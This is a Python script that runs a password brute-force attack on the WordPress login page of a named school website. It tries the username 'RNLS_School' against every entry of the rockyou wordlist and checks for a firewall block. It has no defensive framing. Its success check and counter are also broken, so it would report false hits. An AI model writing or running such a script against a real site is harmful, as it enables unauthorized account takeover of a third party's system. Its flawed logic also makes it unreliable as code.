import sys
import requests
import threading

pwd = "0"

cookies = {
    'wordpress_test_cookie': 'WP+Cookie+check',
}

headers = {
    'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64; rv:78.0) Gecko/20100101 Firefox/78.0',
    'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8',
    'Accept-Language': 'en-US,en;q=0.5',
    'Referer': 'https://rnles.edu.in/wp-login.php?redirect_to=https%3A%2F%2Frnles.edu.in%2Fwp-admin%2F&reauth=1',
    'Content-Type': 'application/x-www-form-urlencoded',
    'Origin': 'https://rnles.edu.in',
    'Connection': 'keep-alive',
    'Upgrade-Insecure-Requests': '1',
}


def Brute():
    print()
    print("[*] Started Brute Force Attack On Target")
    print("[+] Attacking")
    passwords = [x.strip() for x in open('/usr/share/wordlists/rockyou.txt', 'r').readlines() if x]
    
    for password in passwords:
        data = {
          'log': 'RNLS_School',
          'pwd': password,
          'wp-submit': 'Log In',
          'redirect_to': 'https://rnles.edu.in/wp-admin/',
          'testcookie': '1'
        }
        
        number = '0'
        number += '1'
        print("[*] Trying Password#" + number + ": " + password)

        response = requests.post('https://rnles.edu.in/wp-login.php', headers=headers, cookies=cookies, data=data)

        if "The firewall on this server is blocking your connection" in response.text:
            print("[-] Your IP Has Been Blocked By The Firewall")
            sys.exit()
        
        if "The password you entered for the username" and "Unauthorized Access" not in response.text:
            print()
            print("[+] Password Found: " + password)
            pwd = "1"
            sys.exit()


try:
    thread = threading.Thread(target=Brute)
    thread.start()
    thread.join()

except KeyboardInterrupt:
    print("[-] Aborted")
    sys.exit()


if pwd == "0":
    print("[-] Password Not Found")
    sys.exit()
